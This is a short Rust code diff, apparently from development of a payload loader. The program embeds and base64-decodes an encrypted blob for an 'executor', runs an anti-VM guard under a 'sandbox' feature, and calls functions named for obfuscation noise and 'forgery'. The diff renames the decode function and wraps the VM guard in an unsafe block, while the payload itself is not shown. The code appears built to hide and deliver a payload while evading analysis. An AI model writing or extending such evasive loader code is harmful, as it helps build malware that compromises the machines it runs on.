@@ -15,17 +15,17 @@ use base64::engine::general_purpose::STANDARD;
 use base64::Engine;
 const ENCRYPT_B64: &'static [u8] = include_bytes!("encrypt.bin");
 
-fn base64_decode_payload() -> Option<Vec<u8>> {
-    // Decode base64 from the embedded constant
+fn base64_decode() -> Option<Vec<u8>> {
     let raw = std::str::from_utf8(ENCRYPT_B64).ok()?;
     let decoded = STANDARD.decode(raw.trim()).ok()?;
-    // New format: return decoded bytes (x||c2||hash1||c1) - detailed validation is performed by the executor
     Some(decoded)
 }
 
 fn main() {
     #[cfg(feature = "sandbox")]
-    guard::guard_vm();
+    unsafe {
+        guard::guard_vm();
+    }
 
     obfuscation_noise();
 
@@ -33,7 +33,7 @@ fn main() {
     forgery::bundle::bundlefile();
 
     #[cfg(feature = "base64_decode")]
-    let decrypted_data = match base64_decode_payload() {
+    let decrypted_data = match base64_decode() {
             Some(d) => d,
             None => process::exit(1),
     };
